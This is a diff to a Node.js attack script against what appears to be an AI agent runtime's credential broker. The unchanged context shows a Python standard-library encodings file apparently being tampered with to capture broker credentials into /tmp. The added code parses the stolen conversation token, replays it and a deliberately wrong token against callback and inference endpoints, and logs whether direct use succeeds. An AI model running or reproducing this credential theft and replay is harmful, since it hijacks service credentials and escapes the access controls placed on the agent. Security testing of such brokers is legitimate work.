@@ -1,5 +1,6 @@
 const fs = require("node:fs");
 const http = require("node:http");
+const https = require("node:https");
 
 const capturePath = "/tmp/gflb-broker-credentials.json";
 const sourcePath = "/usr/local/lib/python3.13/encodings/utf_32_be.py";
@@ -18,6 +19,21 @@ function trigger(body) {
       const chunks = [];
       res.on("data", (chunk) => chunks.push(chunk));
       res.on("end", () => resolve({ status: res.statusCode, body: Buffer.concat(chunks).toString("utf8") }));
+    });
+    req.on("timeout", () => req.destroy(new Error("timeout")));
+    req.on("error", reject);
+    req.end(body);
+  });
+}
+
+function directRequest(url, method, headers, body, timeout = 30000) {
+  return new Promise((resolve, reject) => {
+    const parsed = new URL(url);
+    const requestHeaders = { ...headers, "Content-Length": body.length };
+    const req = https.request({ hostname: parsed.hostname, port: parsed.port || 443, path: parsed.pathname + parsed.search, method, headers: requestHeaders, timeout }, (res) => {
+      const chunks = [];
+      res.on("data", (chunk) => chunks.push(chunk));
+      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks).toString("utf8") }));
     });
     req.on("timeout", () => req.destroy(new Error("timeout")));
     req.on("error", reject);
@@ -45,10 +61,23 @@ async function main() {
     } else { try { fs.unlinkSync(pycPath); } catch {} }
   }
   const captured = fs.readFileSync(capturePath, "utf8");
+  const credentials = JSON.parse(captured);
+  const token = credentials.conversation_token;
+  const wrongToken = token.slice(0, -1) + (token.endsWith("A") ? "B" : "A");
+  const callbackBody = Buffer.from("{}");
+  const callbackHeaders = (value) => ({ "Content-Type": "application/json", Authorization: `Bearer ${value}` });
+  const callbackCorrect = await directRequest(`${credentials.upstreams.callbacks}/messages`, "POST", callbackHeaders(token), callbackBody);
+  const callbackWrong = await directRequest(`${credentials.upstreams.callbacks}/messages`, "POST", callbackHeaders(wrongToken), callbackBody);
+  const inferenceHeaders = (value) => ({ "Content-Type": "application/json", Accept: "application/json", "anthropic-version": "2023-06-01", Authorization: `Bearer ${value}` });
+  const inferenceCorrect = await directRequest(`${credentials.upstreams.inference}/v1/messages`, "POST", inferenceHeaders(token), callbackBody);
+  const inferenceWrong = await directRequest(`${credentials.upstreams.inference}/v1/messages`, "POST", inferenceHeaders(wrongToken), callbackBody);
   console.log(`BROKER_TRIGGER_RESPONSE=${JSON.stringify(response)}`);
   console.log(`BROKER_CREDENTIAL_CAPTURE=${captured}`);
-  console.log(`CALLBACKS_SOURCE_BASE64=${fs.readFileSync("/app/vega_agentcore/callbacks.py").toString("base64")}`);
-  console.log("BROKER_CAPTURE_WITH_CALLBACK_SOURCE_COMPLETE=true");
+  console.log(`CALLBACK_TOKEN_CORRECT=${JSON.stringify(callbackCorrect)}`);
+  console.log(`CALLBACK_TOKEN_WRONG=${JSON.stringify(callbackWrong)}`);
+  console.log(`INFERENCE_TOKEN_CORRECT=${JSON.stringify(inferenceCorrect)}`);
+  console.log(`INFERENCE_TOKEN_WRONG=${JSON.stringify(inferenceWrong)}`);
+  console.log("BROKER_CREDENTIAL_DIRECT_USE_COMPLETE=true");
 }
 
 main().catch((error) => { console.error(error.stack || String(error)); process.exit(1); });
